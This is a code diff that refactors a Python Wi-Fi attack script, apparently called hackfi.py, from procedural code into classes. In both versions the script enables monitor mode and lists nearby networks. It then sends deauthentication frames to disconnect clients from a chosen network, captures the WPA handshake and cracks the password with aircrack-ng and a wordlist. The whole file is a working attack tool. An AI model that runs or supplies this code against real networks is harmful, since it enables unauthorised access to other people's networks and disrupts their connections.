@@ -1,201 +1,194 @@
-import subprocess
 import os
-import sys
+import subprocess
 import pandas as pd
-import time
 from threading import Thread
+import glob
+import re
+import argparse
 
 
-user = subprocess.check_output("whoami", shell=True).decode().split("\n")[0]
+def banner():
+    ban = '''
 
-if user == "root":
-    try:
-        wordlist = sys.argv[1]
-
-
-        def enableMonitorMode(iface):
-            print("[+] Removing previous logs...")
-            os.system("rm airodump-*")
-            os.system("rm connected-*")
-            print("[+] Logs cleared successfully !\n")
-
-            os.system("airmon-ng check kill")
-
-            cmd = "airmon-ng start " + iface
-            print("Trying to enable Monitor Mode...")
-            enable = subprocess.check_output(cmd, shell=True)
-
-            en_stts = "monitor mode vif enabled"
-            al_en_stts = "monitor mode already enabled"
-
-            if en_stts in enable.decode():
-                return True
-            elif al_en_stts in enable.decode():
-                return True
-            else:
-                return False
-
-        '''
-            enableMonitorMode returns True or False
-            
-        '''
-
-        def disableMonitorMode(iface):
-            cmd = "airmon-ng stop " + iface
-            print("Trying to disable Monitor Mode...")
-            disable = subprocess.check_output(cmd, shell=True)
-
-            dis_stts = "monitor mode vif disabled"
-            csv_file = "airodump-01.csv"
+██╗░░██╗░█████╗░░█████╗░██╗░░██╗░░░░░░███████╗██╗
+██║░░██║██╔══██╗██╔══██╗██║░██╔╝░░░░░░██╔════╝██║
+███████║███████║██║░░╚═╝█████═╝░█████╗█████╗░░██║
+██╔══██║██╔══██║██║░░██╗██╔═██╗░╚════╝██╔══╝░░██║
+██║░░██║██║░░██║╚█████╔╝██║░╚██╗░░░░░░██║░░░░░██║
+╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝
 
 
-            if dis_stts in disable.decode():
-                os.remove(csv_file)
-                return True
-            else:
-                return False
-
-        '''
-            disableMonitorMode returns True or False
-
-        '''
-
-        def airoDump(iface):
-            print("\n[+] Scanning for available routers...")
-            print("[!] Press Ctrl + C when you find your router.")
-            time.sleep(3)
-            cmd = "airodump-ng -w airodump --output-format csv " + iface
-            os.system(cmd)
-            csv_file = "airodump-01.csv"
-
-            os.system("clear")
-
-            df = pd.read_csv(csv_file)
-            df = df.dropna()
-
-            ESSID = df[' ESSID']
-            BSSID = df['BSSID']
-
-            print("[+] Available Routers :\n-----------------------------------------------------")
-            print("Index\t\tESSID\t\t\tBSSID\n-----------------------------------------------------")
-
-            for i in range(len(ESSID)):
-                print(i, '\t', ESSID[i], '\t\t', BSSID[i])
-            print("-----------------------------------------------------")
-
-            essid_index = int(input("Enter ESSID Index : "))
-
-            if essid_index in range(len(ESSID)):
-                return df, essid_index
-
-            else:
-                print("[-] Invalid Index ! Please wait...\n\n")
-                airoDump(iface)
-
-        '''
-            airoDump returns df and essid index
-        
-        '''
-
-        def extractBSSIDCh(interface, df, index):
-            modem_df = df.loc[index]
-            bssid = modem_df["BSSID"]
-            ch = modem_df[" channel"]
-
-            cmd = "airodump-ng -w connected --output-format csv -c " + str(ch) + " --bssid " + bssid + " " + interface
-            os.system(cmd)
-
-            con_csv = "connected-01.csv"
-            os.remove(con_csv)
-
-            return bssid, ch
-
-        '''
-            extractBSSIDCh returns bssid and ch
-        
-        '''
-
-        def disconnectStation(iface, bssid):
-            cmd = "xterm -e /bin/bash -l -c 'aireplay-ng --deauth 10 -a " + bssid + " " + iface + "'"
-
-            print("Deauthenticating connect device...")
-            os.system(cmd)
-            print("\n[+] Deauthentication Process Done !")
-
-        def getCap(iface, bssid, channel):
-            print("\n[!] Press Ctrl+C whenever connected device found !")
-            cmd = "xterm -e /bin/bash -l -c 'airodump-ng -w handshake --output-format cap -c " + str(channel) + " --bssid " + bssid + " " + iface + "'"
-            os.system(cmd)
-
-        def captureHandshake(iface, bssid, channel):
-            t1 = Thread(target=disconnectStation, args=(iface, bssid))
-            t2 = Thread(target=getCap, args=(iface, bssid, channel))
-
-            t2.start()
-            time.sleep(2)
-            t1.start()
-
-            t1.join()
-            t2.join()
-
-            print("\n[+] Handshake file captured !\n")
-
-        def crackPassword(wordlist):
-            cmd = "aircrack-ng handshake-01.cap -w " + wordlist
-            os.system(cmd)
-            subprocess.check_output("mv handshake-01.cap ./bin/", shell=True)
+Author: Nitin Choudhury
+Version: 0.1.0
+    '''
 
 
-        def main():
+class Interface:
 
-            try:
-                iface = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True)[:-1].decode()
-                enstatus = enableMonitorMode(iface)
+    def __init__(self, interface):
+        self.iface = interface
 
-                if enstatus == True:
-                    print("[+] Monitor Mode enabled successfully !")
-                    iface = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True)[:-1].decode()
+    def checkMode(self):
+        ifaceinfo = subprocess.check_output(f"sudo iwconfig {self.iface}", shell=True).decode()
+        mode = re.findall("(?:Mode:)([a-zA-Z]+)", ifaceinfo)[0]
 
-                    df, essid_index = airoDump(iface)
+        return mode.lower()
 
-                    bssid, channel = extractBSSIDCh(iface, df, essid_index)
-                    captureHandshake(iface, bssid, channel)
+    def enableMonitorMode(self):
 
-                    distatus = disableMonitorMode(iface)
+        if self.checkMode()=="managed":
+            subprocess.call([f"sudo ifconfig {self.iface} down"], shell=True)
+            subprocess.call([f"sudo iwconfig {self.iface} mode monitor"], shell=True)
+            subprocess.call([f"sudo ifconfig {self.iface} up"], shell=True)
 
-                    if distatus == True:
-                        print("[+] Monitor Mode disabled successfully !")
+        if self.checkMode()=="monitor":
+            return True
+        else:
+            return False
 
-                    else:
-                        print("[-] Unable to disable Monitor Mode ! Disable it manually. [cmd : airmon-ng stop <interface>]")
 
-                    crackPassword(wordlist)
+    def disableMonitorMode(self):
 
-                else:
-                    print("[-] Unable to enable Monitor Mode ! Enable it manually. [cmd : airmon-ng start <interface>]")
+        if self.checkMode()=="managed":
+            subprocess.call([f"sudo ifconfig {self.iface} down"], shell=True)
+            subprocess.call([f"sudo iwconfig {self.iface} mode managed"], shell=True)
+            subprocess.call([f"sudo ifconfig {self.iface} up"], shell=True)
+
+        if self.checkMode()=="monitor":
+            return True
+        else:
+            return False
+
+
+    def startNetManager(self):
+        subprocess.call(["sudo systemctl start NetworkManager"], shell=True)
+
+
+class Capture:
+
+    def __init__(self, interface):
+        self.iface = interface
+
+    def captureNetwork(self):
+        cmd = f"sudo xterm -e /bin/bash -c -l 'airodump-ng -w tmp/airodump --output-format csv {self.iface}'"
+        os.system(cmd)
+
+        latest = sorted(glob.glob("tmp/airodump-*.csv"))[-1]
+        networkDF = pd.read_csv(f"{latest}", usecols=['BSSID', ' ESSID', ' channel']).dropna()
+
+        return networkDF
+
+    def extractInfo(self, index, networkDF):
+        info = networkDF.iloc[index]
+
+        BSSID = info['BSSID']
+        ESSID = info[' ESSID']
+        CH = info[' channel']
+
+        return (BSSID, ESSID, CH)
+
+    def deauth(self, bssid):
+        cmd = f"sudo xterm -e /bin/bash -c -l 'aireplay-ng --deauth 10 -a {bssid} {self.iface}'"
+        os.system(cmd)
+
+    def monHandshake(self, bssid, channel):
+        cmd = f"sudo xterm -e /bin/bash -c -l 'airodump-ng -w tmp/handshake --output-format cap -c {channel} --bssid {bssid} {self.iface}'"
+        os.system(cmd)
+
+    def grabCAP(self, bssid, channel):
+        t1 = Thread(target=self.monHandshake, args=(bssid, channel,))
+        t2 = Thread(target=self.deauth, args=(bssid,))
+
+        t1.start()
+        t2.start()
+
+        t2.join()
+        t1.join()
+
+
+class Cracker:
+
+    def __init__(self, wordlist):
+        self.wordlist = wordlist
+
+    def getHandshakeFile(self):
+        handshake_file = sorted(glob.glob("./tmp/handshake-*.cap"))[-1]
+
+        return handshake_file
+
+    def aircrack(self):
+        handshake_file = self.getHandshakeFile()
+        crack_cmd = f"xterm -e /bin/bash -c -l 'aircrack-ng {handshake_file} -w {self.wordlist} -l ./tmp/password'"
+        os.system(crack_cmd)
+
+        passF = open("./tmp/password", "r")
+        password = passF.read()
+        passF.close()
+
+        return password
+
+
+def runner(interface, wordlist):
+    ifacectrl = Interface(interface=interface)
+    capture = Capture(interface=interface)
+    cracker = Cracker(wordlist=wordlist)
+
+    monitor_mode = ifacectrl.enableMonitorMode()
+    if monitor_mode:
+        print("[+] Monitor Mode Enabled")
+        net_df = capture.captureNetwork()
+        print(net_df)
+
+        index = int(input("\n\nEnter ESSID Index >> "))
+        bssid, essid, channel = capture.extractInfo(index=index, networkDF=net_df)
+
+        capture.grabCAP(bssid=bssid, channel=channel)
+
+        password = cracker.aircrack()
+        if password:
+            print("\n[+] KEY FOUND : ", password)
+
+        else:
+            print("\n[-] Sorry, Unable to find the key!")
+
+        managed_mode = ifacectrl.disableMonitorMode()
+        if managed_mode:
+            print("[+] Monitor Mode Disabled")
+
+        else:
+            print("[!] Please Manually Disable Monitor Mode")
+
+    else:
+        print("[!] Unable to start Monitor Mode")
 
 
 
-            except KeyboardInterrupt:
-                iface = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", shell=True)[:-1].decode()
-                distatus = disableMonitorMode(iface)
 
-                if distatus == True:
-                    print("[+] Monitor Mode disabled successfully !")
+if __name__ == '__main__':
 
-                else:
-                    print("[-] Unable to disable Monitor Mode ! Disable it manually. [cmd : airmon-ng stop <interface>]")
+    if os.name=="posix":
+        parser = argparse.ArgumentParser()
 
-        if __name__ == '__main__':
-            main()
-            subprocess.call("rm airodump-*", shell=True)
-            subprocess.call("rm connected-*", shell=True)
-            subprocess.call("rm handshake-*", shell=True)
-            print("[+] Done !")
+        parser.add_argument(
+            '-i', '--interface',
+            type=str,
+            help="Set Interface",
+            required=True
+        )
 
+        parser.add_argument(
+            '-w', '--wordlist',
+            type=str,
+            help="Set wordlist for cracking password",
+            required=True
+        )
 
-    except IndexError:
-        print("[-] Wordlist Missing ! \n\nusage : sudo python3 hackfi.py <wordlist>")
+        args = parser.parse_args()
 
-else:
-    print("\n[-_-] Are you fucking drunk !!! Run this script as root !\n")
+        interface = args.interface
+        wordlist = args.wordlist
+
+        runner(interface=interface, wordlist=wordlist)
+
+    else:
+        print("Sorry, this program is developed for Linux based environment only!")
